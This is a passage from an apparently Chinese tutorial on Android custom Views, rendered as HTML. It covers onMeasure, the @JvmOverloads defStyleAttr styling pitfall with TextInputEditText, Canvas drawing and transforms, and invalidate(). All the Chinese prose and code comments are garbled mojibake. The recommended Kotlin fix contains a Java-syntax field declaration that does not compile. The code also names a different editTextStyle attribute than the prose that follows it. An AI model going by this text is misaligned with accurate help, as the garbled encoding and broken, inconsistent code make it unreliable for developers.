                R.styleable.CustomCircleView_circleRadius,
                <span class="hljs-number">50f</span>
            )
        } <span class="hljs-keyword">finally</span> {
            <span class="hljs-comment">// å›æ”¶TypedArrayï¼Œé¿å…èµ„æºæ³„æ¼</span>
            typedArray.recycle()
        }
    }
}
</code></pre>
<h3 data-id="heading-29">å¤„ç†å¸ƒå±€æµ‹é‡ï¼ˆå¯é€‰ï¼‰</h3>
<p>è‹¥éœ€è‡ªå®šä¹‰ <code>View</code> çš„å°ºå¯¸è®¡ç®—é€»è¾‘ï¼ˆå¦‚å›ºå®šå®½é«˜æ¯”ä¾‹ã€è‡ªé€‚åº”çˆ¶å®¹å™¨ï¼‰ï¼Œå¯é‡å†™ <code>onMeasure()</code> æ–¹æ³•ï¼Œè‡ªå®šä¹‰æµ‹é‡è§„åˆ™ï¼š</p>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-keyword">override</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">onMeasure</span><span class="hljs-params">(widthMeasureSpec: <span class="hljs-type">Int</span>, heightMeasureSpec: <span class="hljs-type">Int</span>)</span></span> {
    <span class="hljs-keyword">val</span> desiredSize = <span class="hljs-number">200</span> <span class="hljs-comment">// æœŸæœ›é»˜è®¤å°ºå¯¸200px</span>
    <span class="hljs-comment">// æ ¹æ®çˆ¶å®¹å™¨çº¦æŸå’ŒæœŸæœ›å°ºå¯¸ï¼Œè®¡ç®—æœ€ç»ˆå®½é«˜</span>
    <span class="hljs-keyword">val</span> width = resolveSize(desiredSize, widthMeasureSpec)
    <span class="hljs-keyword">val</span> height = resolveSize(desiredSize, heightMeasureSpec)
    <span class="hljs-comment">// è®¾ç½®æµ‹é‡åçš„å®½é«˜</span>
    setMeasuredDimension(width, height)
}
</code></pre>
<h3 data-id="heading-30">è¡¥å……æç¤º</h3>
<p>å½“åº”ç”¨éœ€è¦é€‚é…ç‰¹å®šéœ€æ±‚çš„å¯å¤ç”¨ã€ä¸“ç”¨ç»„ä»¶ï¼Œæˆ–éœ€å®ç°æ ‡å‡† <code>View</code> æ— æ³•å®Œæˆçš„åŠ¨ç”»ã€è®¡ç®—é€»è¾‘ã€è‡ªå®šä¹‰å±æ€§ç­‰åŠŸèƒ½æ—¶ï¼Œè‡ªå®šä¹‰ <code>View</code> æ˜¯æœ€ä¼˜é€‰æ‹©ã€‚</p>
<h3 data-id="heading-31">æ€»ç»“</h3>
<p>é€šè¿‡ <code>XML</code> ç»“åˆä»£ç çš„æ–¹å¼åœ¨ Android ä¸­å®ç°è‡ªå®šä¹‰ <code>View</code> ï¼Œèƒ½ä¸º UI è®¾è®¡å¸¦æ¥æé«˜çš„çµæ´»æ€§ã€‚å¼€å‘è€…å¯é€šè¿‡è‡ªå®šä¹‰ <code>View</code> ç³»ç»Ÿå’Œ <strong>Compose</strong> åˆ›å»ºå„ç±»ä¸ªæ€§åŒ–æ§ä»¶ã€‚</p>
<h3 data-id="heading-32">è¿›é˜¶ï¼šè°¨æ…ä½¿ç”¨ @JvmOverloads</h3>
<p><code>@JvmOverloads</code> æ˜¯ Kotlin ä¸­ç”¨äºç®€åŒ– Kotlin ä¸ Java äº’æ“ä½œæ€§çš„æ³¨è§£ï¼Œå®ƒä¼šä¸º Kotlin å‡½æ•°æˆ–ç±»è‡ªåŠ¨ç”Ÿæˆå¤šä¸ªé‡è½½æ–¹æ³•/æ„é€ å‡½æ•°ï¼ˆå°¤å…¶é€‚ç”¨äº Kotlin çš„é»˜è®¤å‚æ•°â€”â€”Java åŸç”Ÿä¸æ”¯æŒé»˜è®¤å‚æ•°ç‰¹æ€§ï¼‰ã€‚</p>
<p>ä½¿ç”¨ <code>@JvmOverloads</code> æ—¶ï¼ŒKotlin ç¼–è¯‘å™¨ä¼šåœ¨ç¼–è¯‘åçš„å­—èŠ‚ç ä¸­ç”Ÿæˆå¤šä¸ªæ–¹æ³•/æ„é€ å‡½æ•°ç­¾åï¼Œä»¥è¦†ç›–æ‰€æœ‰å¸¦é»˜è®¤å€¼å‚æ•°çš„ç»„åˆã€‚ä½†åœ¨å®ç°è‡ªå®šä¹‰ <code>View</code> æ—¶ï¼Œè‹¥ä¸è°¨æ…ä½¿ç”¨ <code>@JvmOverloads</code>ï¼Œå¯èƒ½ä¼šæ„å¤–è¦†ç›–é»˜è®¤ <code>View</code> æ ·å¼ï¼Œå¯¼è‡´è‡ªå®šä¹‰ <code>View</code> ä¸¢å¤±é¢„æœŸçš„ç³»ç»Ÿæ ·å¼â€”â€”è¿™ä¸€é—®é¢˜åœ¨æ‰©å±• <code>Button</code>ã€<code>TextView</code> ç­‰é¢„å®šä¹‰æ ·å¼çš„ Android  <code>View</code> æ—¶å°¤ä¸ºçªå‡ºã€‚</p>
<p>æˆ‘ä»¬çœ‹çœ‹ä¸‹é¢è¿™ä¸ªç¤ºä¾‹ï¼Œå®ç°è‡ªå®šä¹‰ <code>TextInputEditText</code>ï¼š</p>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-keyword">class</span> <span class="hljs-title class_">ElasticTextInputEditText</span> <span class="hljs-meta">@JvmOverloads</span> <span class="hljs-keyword">constructor</span>(
    context: Context,
    attrs: AttributeSet? = <span class="hljs-literal">null</span>,
    defStyleAttr: <span class="hljs-built_in">Int</span> = <span class="hljs-number">0</span>
) : TextInputEditText(context, attrs, defStyleAttr) {
    <span class="hljs-comment">// è‡ªå®šä¹‰ä¸šåŠ¡é€»è¾‘</span>
}
</code></pre>
<p>åœ¨æ­¤ç¤ºä¾‹ä¸­ï¼Œå°† <code>ElasticTextInputEditText</code> ä½œä¸ºå¸¸è§„ <code>TextInputEditText</code> ä½¿ç”¨æ—¶ï¼Œå¯èƒ½ä¼šå‡ºç°æ„å¤–è¡Œä¸ºæˆ–å´©æºƒâ€”â€”åŸå› æ˜¯ <code>defStyleAttr</code> è¢«é‡å†™ä¸º <code>0</code>ï¼Œå¯¼è‡´è‡ªå®šä¹‰ <code>View</code> æ— æ³•ç»§æ‰¿ <code>TextInputEditText</code> çš„é»˜è®¤æ ·å¼ã€‚</p>
<p>å½“ä» <code>XML</code> åŠ è½½ <code>View</code> æ—¶ï¼Œç³»ç»Ÿä¼šè°ƒç”¨åŒå‚æ•°æ„é€ å‡½æ•°ï¼ˆåŒ…å« <code>Context</code> å’Œ <code>AttributeSet</code> çš„é‚£ä¸ªï¼‰ï¼Œè€Œè¯¥åŒå‚æ•°æ„é€ å‡½æ•°ä¼šè¿›ä¸€æ­¥è°ƒç”¨ä¸‰å‚æ•°æ„é€ å‡½æ•°ï¼š</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-title function_">ElasticTextInputEditText</span><span class="hljs-params">(Context context, <span class="hljs-meta">@Nullable</span> AttributeSet attrs)</span> {
    <span class="hljs-built_in">this</span>(context, attrs, <span class="hljs-number">0</span>);
}
</code></pre>
<p>ä¸‰å‚æ•°æ„é€ å‡½æ•°çš„ <code>defStyleAttr</code> å‚æ•°ï¼Œåœ¨è‡ªå®šä¹‰å®ç°ä¸­å¸¸è¢«é»˜è®¤è®¾ä¸º <code>0</code>ï¼Œä½†æ ¹æ® Android å®˜æ–¹æ–‡æ¡£æè¿°ï¼Œå…¶ç”¨é€”ä¸ºï¼š</p>
<blockquote>
<p>ä» <code>XML</code> åŠ è½½ <code>View</code> æ—¶ï¼Œåº”ç”¨ä¸»é¢˜å±æ€§ä¸­è¯¥ç±»çš„ç‰¹å®šåŸºç¡€æ ·å¼ã€‚ <code>View</code> çš„æ­¤æ„é€ å‡½æ•°å…è®¸å­ç±»åœ¨ <code>inflate</code> æ—¶ä½¿ç”¨è‡ªèº«çš„åŸºç¡€æ ·å¼â€”â€”ä¾‹å¦‚ï¼Œ<code>Button</code> çš„æ„é€ å‡½æ•°ä¼šè°ƒç”¨æ­¤ç‰ˆæœ¬çš„çˆ¶ç±»æ„é€ å‡½æ•°ï¼Œå¹¶ä¼ å…¥ <code>com.android.internal.R.attr.buttonStyle</code> ä½œä¸º <code>defStyleAttr</code>ï¼Œä½¿ <code>Button</code> çš„æ ·å¼å¯é€šè¿‡ä¸»é¢˜è¿›è¡Œä¿®æ”¹ã€‚</p>
</blockquote>
<p>è‹¥çœç•¥æ­£ç¡®çš„ <code>defStyleAttr</code> å€¼ï¼ˆå¦‚ <code>R.attr.editTextStyle</code>ï¼‰ï¼Œä¼šå¯¼è‡´è‡ªå®šä¹‰ <code>View</code> æ— æ³•æ­£ç¡®ç»§æ‰¿ç³»ç»Ÿæˆ–ä¸»é¢˜å®šä¹‰çš„åŸºç¡€æ ·å¼ï¼Œåœ¨ <code>XML</code> <code>inflate</code> æ—¶å‡ºç°æ ·å¼ä¸ä¸€è‡´æˆ–å¼‚å¸¸è¡Œä¸ºã€‚</p>
<h3 data-id="heading-33">TextInputEditText çš„å†…éƒ¨å®ç°</h3>
<p>æŸ¥çœ‹ <code>TextInputEditText</code> çš„å†…éƒ¨æºç å¯çŸ¥ï¼Œå®ƒä¼šä¸»åŠ¨ä¼ å…¥ <code>R.attr.editTextStyle</code> ä½œä¸º <code>defStyleAttr</code>ï¼š</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">TextInputEditText</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">AppCompatEditText</span> {
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> <span class="hljs-type">Rect</span> <span class="hljs-variable">parentRect</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Rect</span>();
    <span class="hljs-keyword">public</span> <span class="hljs-title function_">TextInputEditText</span><span class="hljs-params">(<span class="hljs-meta">@NonNull</span> Context context)</span> {
        <span class="hljs-built_in">this</span>(context, <span class="hljs-literal">null</span>);
    }
    <span class="hljs-keyword">public</span> <span class="hljs-title function_">TextInputEditText</span><span class="hljs-params">(<span class="hljs-meta">@NonNull</span> Context context, <span class="hljs-meta">@Nullable</span> AttributeSet attrs)</span> {
        <span class="hljs-built_in">this</span>(context, attrs, R.attr.editTextStyle);
    }
    <span class="hljs-keyword">public</span> <span class="hljs-title function_">TextInputEditText</span><span class="hljs-params">(<span class="hljs-meta">@NonNull</span> Context context, <span class="hljs-meta">@Nullable</span> AttributeSet attrs, <span class="hljs-type">int</span> defStyleAttr)</span> {
        <span class="hljs-built_in">super</span>(context, attrs, defStyleAttr);
    }
}
</code></pre>
<p>åœ¨ <code>TextInputEditText</code> çš„å®ç°ä¸­ï¼ŒåŒå‚æ•°æ„é€ å‡½æ•°ä¼šå°† <code>android.R.attr.editTextStyle</code> ä½œä¸ºç¬¬ä¸‰ä¸ªå‚æ•°ï¼ˆ<code>defStyleAttr</code>ï¼‰ä¼ é€’ç»™çˆ¶ç±»ï¼Œç¡®ä¿æ ·å¼çš„æ­£ç¡®ç»§æ‰¿ã€‚</p>
<h3 data-id="heading-34">ä¿®å¤æ–¹æ³•</h3>
<p>è¦è§£å†³æ ·å¼ç»§æ‰¿é—®é¢˜ï¼Œéœ€åœ¨è‡ªå®šä¹‰ <code>View</code> çš„æ„é€ å‡½æ•°ä¸­ï¼ŒæŒ‡å®šæ­£ç¡®çš„ <code>defStyleAttr</code> é»˜è®¤å€¼ï¼ˆå¦‚ <code>R.attr.editTextStyle</code>ï¼‰ï¼š</p>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-keyword">class</span> <span class="hljs-title class_">ElasticTextInputEditText</span> <span class="hljs-meta">@JvmOverloads</span> <span class="hljs-keyword">constructor</span>(
    context: Context,
    attrs: AttributeSet? = <span class="hljs-literal">null</span>,
    defStyleAttr: <span class="hljs-built_in">Int</span> = android.R.attr.editTextStyle
) : TextInputEditText(context, attrs, defStyleAttr) {
    <span class="hljs-keyword">private</span> boolean mTextInputLayoutFocusedRectEnabled;
    <span class="hljs-comment">// è‡ªå®šä¹‰ä¸šåŠ¡é€»è¾‘</span>
}
</code></pre>
<p>é€šè¿‡æ˜¾å¼å°† <code>androidx.appcompat.R.attr.editTextStyle</code> è®¾ä¸º <code>defStyleAttr</code> çš„é»˜è®¤å€¼ï¼Œå¯ç¡®ä¿è‡ªå®šä¹‰ <code>View</code> åœ¨ <code>XML</code> <code>inflate</code> æ—¶ï¼Œæ­£ç¡®ç»§æ‰¿ <code>TextInputEditText</code> çš„é¢„æœŸåŸºç¡€æ ·å¼ï¼Œä¸åŸç”Ÿ <code>TextInputEditText</code> çš„è¡Œä¸ºä¿æŒä¸€è‡´ã€‚</p>
<h2 data-id="heading-35">Canvas</h2>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/68250179027d44f99740fe98b8df128d~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgUm9ja0J5dGU=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769041031&amp;x-signature=YLqmecbCFftsxqfaDBTkAQGzn24%3D" alt="3.png" loading="lazy"/></p>
<p><code>Canvas</code> æ˜¯ Android è‡ªå®šä¹‰ç»˜åˆ¶çš„æ ¸å¿ƒç»„ä»¶ï¼Œæä¾›äº†ç›´æ¥åœ¨å±å¹•æˆ–å…¶ä»–ç»˜åˆ¶è¡¨é¢ï¼ˆå¦‚ <code>Bitmap</code>ï¼‰ä¸Šæ¸²æŸ“å›¾å½¢çš„æ¥å£ã€‚å¼€å‘è€…é€šè¿‡ <code>Canvas</code> å¯å®Œå…¨æ§åˆ¶ç»˜åˆ¶è¿‡ç¨‹ï¼Œå¸¸ç”¨äºåˆ›å»ºè‡ªå®šä¹‰ <code>View</code> ã€å¤æ‚åŠ¨ç”»å’Œä¸ªæ€§åŒ–è§†è§‰æ•ˆæœã€‚</p>
<h3 data-id="heading-36">å®æˆ˜é—®é¢˜</h3>
<p>å¦‚ä½•åˆ›å»ºä¸€ä¸ªè‡ªå®šä¹‰ <code>View</code> ï¼Œä»¥æ¸²æŸ“æ ‡å‡†åº“ä¸æ”¯æŒçš„å¤æ‚å½¢çŠ¶æˆ– UI å…ƒç´ ï¼Ÿ</p>
<p>ä½ ä¼šä½¿ç”¨å“ªäº› <code>Canvas</code> æ–¹æ³•å’Œç›¸å…³ APIï¼Ÿ</p>
<h3 data-id="heading-37">å·¥ä½œåŸç†</h3>
<p><code>Canvas</code> ç±»ä»£è¡¨ä¸€ä¸ª 2D ç»˜åˆ¶è¡¨é¢ï¼Œå¼€å‘è€…å¯åœ¨å…¶ä¸Šç»˜åˆ¶å½¢çŠ¶ã€æ–‡æœ¬ã€å›¾ç‰‡ç­‰å†…å®¹ã€‚</p>
<p>å®ƒä¸ <code>Paint</code> ç±»ç´§å¯†é…åˆâ€”â€”<code>Paint</code> è´Ÿè´£å®šä¹‰ç»˜åˆ¶å†…å®¹çš„å¤–è§‚ï¼ˆåŒ…æ‹¬é¢œè‰²ã€æ ·å¼ã€ç¬”è§¦å®½åº¦ã€å­—ä½“å¤§å°ç­‰ï¼‰ï¼›å½“é‡å†™è‡ªå®šä¹‰ <code>View</code> çš„ <code>onDraw()</code> æ–¹æ³•æ—¶ï¼Œç³»ç»Ÿä¼šè‡ªåŠ¨ä¼ å…¥ä¸€ä¸ª <code>Canvas</code> å¯¹è±¡ï¼Œä¾›å¼€å‘è€…å®šä¹‰å…·ä½“çš„ç»˜åˆ¶å†…å®¹ã€‚</p>
<h3 data-id="heading-38">åŸºç¡€ç»˜åˆ¶ç¤ºä¾‹</h3>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-keyword">class</span> <span class="hljs-title class_">CustomView</span>(context: Context) : View(context) {
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">val</span> paint = Paint().apply {
        color = Color.BLUE <span class="hljs-comment">// ç»˜åˆ¶é¢œè‰²ï¼šè“è‰²</span>
        style = Paint.Style.FILL <span class="hljs-comment">// å¡«å……æ ·å¼ï¼šå®å¿ƒ</span>
    }
    <span class="hljs-keyword">override</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">onDraw</span><span class="hljs-params">(canvas: <span class="hljs-type">Canvas</span>)</span></span> {
        <span class="hljs-keyword">super</span>.onDraw(canvas)
        <span class="hljs-comment">// åœ¨è‡ªå®šä¹‰Viewçš„ä¸­å¿ƒç»˜åˆ¶ä¸€ä¸ªåŠå¾„ä¸º100pxçš„è“è‰²åœ†å½¢</span>
        canvas.drawCircle(width / <span class="hljs-number">2f</span>, height / <span class="hljs-number">2f</span>, <span class="hljs-number">100f</span>, paint)
    }
}
</code></pre>
<p>åœ¨æ­¤ç¤ºä¾‹ä¸­ï¼Œ<code>onDraw()</code> æ–¹æ³•é€šè¿‡ç³»ç»Ÿä¼ å…¥çš„ <code>Canvas</code> å¯¹è±¡ï¼Œåœ¨è‡ªå®šä¹‰ <code>View</code> çš„ä¸­å¿ƒä½ç½®ç»˜åˆ¶äº†ä¸€ä¸ªè“è‰²å®å¿ƒåœ†å½¢ã€‚</p>
<h3 data-id="heading-39">Canvas çš„å¸¸ç”¨æ“ä½œ</h3>
<p><code>Canvas</code> æ”¯æŒå¤šç§ç»˜åˆ¶æ“ä½œï¼Œæ»¡è¶³ä¸åŒåœºæ™¯çš„éœ€æ±‚ï¼š</p>
<ul>
<li><strong>ç»˜åˆ¶å½¢çŠ¶</strong>ï¼šé€šè¿‡ <code>drawCircle()</code>ï¼ˆåœ†å½¢ï¼‰ã€<code>drawRect()</code>ï¼ˆçŸ©å½¢ï¼‰ã€<code>drawLine()</code>ï¼ˆçº¿æ¡ï¼‰ã€<code>drawOval()</code>ï¼ˆæ¤­åœ†ï¼‰ç­‰æ–¹æ³•ï¼Œç»˜åˆ¶åŸºç¡€å‡ ä½•å½¢çŠ¶ï¼›</li>
<li><strong>ç»˜åˆ¶æ–‡æœ¬</strong>ï¼šé€šè¿‡ <code>drawText()</code> æ–¹æ³•ï¼ŒæŒ‰æŒ‡å®šåæ ‡ã€å­—ä½“å¤§å°å’Œé¢œè‰²æ¸²æŸ“æ–‡æœ¬å†…å®¹ï¼›</li>
<li><strong>ç»˜åˆ¶å›¾ç‰‡</strong>ï¼šé€šè¿‡ <code>drawBitmap()</code> æ–¹æ³•ï¼Œå°† <code>Bitmap</code> å¯¹è±¡æ¸²æŸ“åˆ°æŒ‡å®šä½ç½®ï¼›</li>
<li><strong>ç»˜åˆ¶è‡ªå®šä¹‰è·¯å¾„</strong>ï¼šç»“åˆ <code>Path</code> å¯¹è±¡å’Œ <code>drawPath()</code> æ–¹æ³•ï¼Œç»˜åˆ¶ä¸è§„åˆ™çš„å¤æ‚å½¢çŠ¶ï¼ˆå¦‚å¤šè¾¹å½¢ã€æ›²çº¿ï¼‰ã€‚</li>
</ul>
<h3 data-id="heading-40">å˜æ¢æ“ä½œ</h3>
<p><code>Canvas</code> æ”¯æŒç¼©æ”¾ã€æ—‹è½¬ã€å¹³ç§»ç­‰åæ ‡ç³»å˜æ¢æ“ä½œï¼Œä¾¿äºç»˜åˆ¶å¤æ‚åœºæ™¯ï¼Œå…·ä½“åŒ…æ‹¬ï¼š</p>
<ul>
<li><strong>å¹³ç§»</strong>ï¼šé€šè¿‡ <code>canvas.translate(dx, dy)</code> å°† <code>Canvas</code> çš„åŸç‚¹ <code>(0,0)</code> ç§»åŠ¨åˆ°æ–°åæ ‡ <code>(dx, dy)</code>ï¼›</li>
<li><strong>ç¼©æ”¾</strong>ï¼šé€šè¿‡ <code>canvas.scale(sx, sy)</code> æŒ‰æ¯”ä¾‹ï¼ˆ<code>sx</code> ä¸º <code>x</code> è½´ç¼©æ”¾æ¯”ï¼Œ<code>sy</code> ä¸º <code>y</code> è½´ç¼©æ”¾æ¯”ï¼‰ç¼©æ”¾åç»­ç»˜åˆ¶çš„å†…å®¹ï¼›</li>
<li><strong>æ—‹è½¬</strong>ï¼šé€šè¿‡ <code>canvas.rotate(degrees)</code> å°† <code>Canvas</code> æŒ‰æŒ‡å®šè§’åº¦ï¼ˆé¡ºæ—¶é’ˆä¸ºæ­£æ–¹å‘ï¼‰æ—‹è½¬ã€‚</li>
</ul>
<p>éœ€æ³¨æ„ï¼šè¿™äº›å˜æ¢æ“ä½œæ˜¯ç´¯ç§¯çš„ï¼Œä¼šå½±å“åç»­æ‰€æœ‰çš„ç»˜åˆ¶è¡Œä¸ºã€‚è‹¥éœ€æ¢å¤åŸå§‹åæ ‡ç³»ï¼Œå¯ç»“åˆ <code>canvas.save()</code> å’Œ <code>canvas.restore()</code> æ–¹æ³•å®ç°ã€‚</p>
<h3 data-id="heading-41">ä½¿ç”¨åœºæ™¯</h3>
<p><code>Canvas</code> åœ¨éœ€è¦é«˜çº§è‡ªå®šä¹‰å›¾å½¢çš„åœºæ™¯ä¸­å°¤ä¸ºå®ç”¨ï¼Œå…¸å‹åœºæ™¯åŒ…æ‹¬ï¼š</p>
<ol>
<li><strong>è‡ªå®šä¹‰View</strong>ï¼šç»˜åˆ¶æ ‡å‡†æ§ä»¶æ— æ³•å®ç°çš„ç‹¬ç‰¹ UI ç»„ä»¶ï¼ˆå¦‚è‡ªå®šä¹‰è¿›åº¦æ¡ã€ä»ªè¡¨ç›˜ï¼‰ï¼›</li>
<li><strong>æ¸¸æˆå¼€å‘</strong>ï¼šç²¾ç¡®æ§åˆ¶æ¸¸æˆä¸­çš„å›¾å½¢æ¸²æŸ“ï¼ˆå¦‚è§’è‰²ã€é“å…·ã€åœºæ™¯å…ƒç´ ï¼‰ï¼›</li>
<li><strong>å›¾è¡¨ä¸ç¤ºæ„å›¾</strong>ï¼šä»¥è‡ªå®šä¹‰æ ¼å¼å¯è§†åŒ–æ•°æ®ï¼ˆå¦‚æŠ˜çº¿å›¾ã€é¥¼å›¾ã€æµç¨‹å›¾ï¼‰ï¼›</li>
<li><strong>å›¾åƒå¤„ç†</strong>ï¼šé€šè¿‡ä»£ç ä¿®æ”¹å›¾ç‰‡å†…å®¹ï¼ˆå¦‚æ·»åŠ æ°´å°ã€è£å‰ªã€é¢œè‰²è°ƒæ•´ï¼‰æˆ–åˆæˆå¤šå¼ å›¾ç‰‡ã€‚</li>
</ol>
<h3 data-id="heading-42">æ€»ç»“</h3>
<p><code>Canvas</code> ä¸º Android å¼€å‘è€…æä¾›äº†åœ¨å±å¹•ä¸Šæ¸²æŸ“è‡ªå®šä¹‰å›¾å½¢çš„çµæ´»æ–¹å¼ã€‚</p>
<p>é€šè¿‡å…¶ä¸°å¯Œçš„ç»˜åˆ¶æ–¹æ³•ï¼ˆå½¢çŠ¶ã€æ–‡æœ¬ã€å›¾ç‰‡ï¼‰å’Œå˜æ¢æ“ä½œï¼Œå¼€å‘è€…å¯åˆ›å»ºå¤šæ ·åŒ–çš„è§†è§‰æ•ˆæœå’Œè‡ªå®šä¹‰ä½“éªŒï¼Œå¹¿æ³›åº”ç”¨äºéœ€è¦é«˜çº§å›¾å½¢èƒ½åŠ›çš„è‡ªå®šä¹‰ <code>View</code> å¼€å‘ä¸­ã€‚</p>
<h2 data-id="heading-43">é‡ç»˜</h2>
<p>é‡ç»˜ï¼ˆ<strong>Invalidation</strong>ï¼‰æ˜¯ Android  <code>View</code> ç³»ç»Ÿä¸­ UI æ›´æ–°çš„åŸºç¡€æœºåˆ¶ï¼ŒæŒ‡æ ‡è®° <code>View</code> éœ€è¦é‡ç»˜çš„è¿‡ç¨‹ã€‚å½“ <code>View</code> è¢«æ ‡è®°ä¸ºéœ€è¦é‡ç»˜åï¼Œç³»ç»Ÿä¼šåœ¨ä¸‹æ¬¡ç»˜åˆ¶å‘¨æœŸï¼ˆ<strong>Vsync</strong> ä¿¡å·è§¦å‘ï¼‰ä¸­åˆ·æ–°è¯¥åŒºåŸŸçš„å±å¹•ï¼Œç¡®ä¿ç”¨æˆ·èƒ½çœ‹åˆ°æœ€æ–°çš„ UI çŠ¶æ€ã€‚</p>
<h3 data-id="heading-44">é¢è¯•é—®é¢˜</h3>
<p><code>invalidate()</code> æ–¹æ³•çš„å·¥ä½œåŸç†æ˜¯ä»€ä¹ˆï¼Ÿå®ƒä¸ <code>postInvalidate()</code> æœ‰ä½•åŒºåˆ«ï¼Ÿè¯·åˆ†åˆ«ç»™å‡ºé€‚åˆä½¿ç”¨å®ƒä»¬çš„çœŸå®åœºæ™¯ã€‚</p>
<p>è‹¥éœ€è¦ä»åå°çº¿ç¨‹æ›´æ–° UI å…ƒç´ ï¼Œå¦‚ä½•ç¡®ä¿é‡ç»˜æ“ä½œå®‰å…¨åœ°åœ¨ä¸»çº¿ç¨‹æ‰§è¡Œï¼Ÿ</p>
<h3 data-id="heading-45">å·¥ä½œåŸç†</h3>
<p>å½“å¼€å‘è€…è°ƒç”¨ <code>invalidate()</code> æˆ– <code>postInvalidate()</code> ç­‰æ–¹æ³•æ—¶ï¼Œä¼šè§¦å‘é‡ç»˜æµç¨‹ï¼šç³»ç»Ÿé¦–å…ˆå°†ç›®æ ‡ <code>View</code> æ ‡è®°ä¸ºâ€œè„ï¼ˆdirtyï¼‰â€çŠ¶æ€ï¼ˆè¡¨ç¤ºè¯¥ <code>View</code> çš„ UI å·²å‘ç”Ÿå˜åŒ–ï¼Œéœ€è¦é‡ç»˜ï¼‰ï¼›éšååœ¨ä¸‹ä¸€å¸§ç»˜åˆ¶æ—¶ï¼Œç³»ç»Ÿä¼šæ‰«ææ‰€æœ‰æ ‡è®°ä¸ºâ€œè„â€çš„ <code>View</code> ï¼Œå°†å…¶çº³å…¥ç»˜åˆ¶æµç¨‹ï¼Œé‡æ–°æ¸²æŸ“è¯¥ <code>View</code> çš„è§†è§‰å‘ˆç°ã€‚</p>
<p>ä¾‹å¦‚ï¼Œå½“ <code>View</code> çš„ä½ç½®ã€å°ºå¯¸ã€é¢œè‰²æˆ–å†…å®¹ç­‰å±æ€§å‘ç”Ÿå˜åŒ–æ—¶ï¼Œé€šè¿‡é‡ç»˜æœºåˆ¶å¯ç¡®ä¿è¿™äº›å˜åŒ–åŠæ—¶åæ˜ åœ¨å±å¹•ä¸Šã€‚</p>
<h3 data-id="heading-46">é‡ç»˜çš„æ ¸å¿ƒæ–¹æ³•</h3>
<ol>
<li><strong>invalidate()</strong>ï¼šæ ‡è®°å•ä¸ª <code>View</code> ä¸ºé‡ç»˜ï¼Œå‘ŠçŸ¥ç³»ç»Ÿåœ¨ä¸‹ä¸€æ¬¡å¸ƒå±€ç»˜åˆ¶æµç¨‹ä¸­é‡ç»˜è¯¥ <code>View</code> ã€‚è¯¥æ–¹æ³•ä¸ä¼šç«‹å³è§¦å‘é‡ç»˜ï¼Œè€Œæ˜¯å°†é‡ç»˜è¯·æ±‚åŠ å…¥æ¶ˆæ¯é˜Ÿåˆ—ï¼Œç­‰å¾…ä¸‹ä¸€å¸§æ‰§è¡Œï¼›</li>
<li><strong>invalidate(Rect dirty)</strong>ï¼š<code>invalidate()</code> çš„é‡è½½ç‰ˆæœ¬ï¼Œå…è®¸æŒ‡å®š <code>View</code> ä¸­éœ€è¦é‡ç»˜çš„ç‰¹å®šçŸ©å½¢åŒºåŸŸï¼ˆ<code>dirty</code> å‚æ•°ï¼‰ã€‚é€šè¿‡ä»…é‡ç»˜å±€éƒ¨åŒºåŸŸï¼Œå¯å‡å°‘ä¸å¿…è¦çš„ç»˜åˆ¶å¼€é”€ï¼Œä¼˜åŒ–æ€§èƒ½ï¼›</li>
<li><strong>postInvalidate()</strong>ï¼šä¸“é—¨ç”¨äºåœ¨é UI çº¿ç¨‹ä¸­æ ‡è®° <code>View</code> é‡ç»˜ã€‚è¯¥æ–¹æ³•ä¼šè‡ªåŠ¨å°†é‡ç»˜è¯·æ±‚æŠ•é€’åˆ°ä¸»çº¿ç¨‹çš„æ¶ˆæ¯é˜Ÿåˆ—ï¼Œç¡®ä¿é‡ç»˜æ“ä½œåœ¨ UI çº¿ç¨‹å®‰å…¨æ‰§è¡Œï¼Œé¿å…çº¿ç¨‹å®‰å…¨é—®é¢˜ã€‚</li>
</ol>
<h3 data-id="heading-47">ä½¿ç”¨ invalidate</h3>
<p>ä»¥ä¸‹æ˜¯è‡ªå®šä¹‰ <code>View</code> çš„ç¤ºä¾‹ï¼šå½“ <code>View</code> çš„çŠ¶æ€ï¼ˆå¦‚åœ†å½¢åŠå¾„ï¼‰å˜åŒ–æ—¶ï¼Œé€šè¿‡è°ƒç”¨ <code>invalidate()</code> æ ‡è®° <code>View</code> é‡ç»˜ï¼Œè§¦å‘é‡ç»˜ä»¥æ›´æ–° UIï¼š</p>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-keyword">class</span> <span class="hljs-title class_">CustomView</span>(context: Context) : View(context) {
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">var</span> circleRadius = <span class="hljs-number">50f</span> <span class="hljs-comment">// åœ†å½¢åˆå§‹åŠå¾„50px</span>
    <span class="hljs-keyword">override</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">onDraw</span><span class="hljs-params">(canvas: <span class="hljs-type">Canvas</span>)</span></span> {
        <span class="hljs-keyword">super</span>.onDraw(canvas)
        <span class="hljs-comment">// ç»˜åˆ¶å½“å‰åŠå¾„çš„çº¢è‰²åœ†å½¢</span>
        canvas.drawCircle(
            width / <span class="hljs-number">2f</span>, height / <span class="hljs-number">2f</span>, circleRadius,
            Paint().apply { color = Color.RED }
        )
    }
    <span class="hljs-comment">// å¢åŠ åœ†å½¢åŠå¾„çš„æ–¹æ³•</span>
    <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">increaseRadius</span><span class="hljs-params">()</span></span> {
        circleRadius += <span class="hljs-number">20f</span>
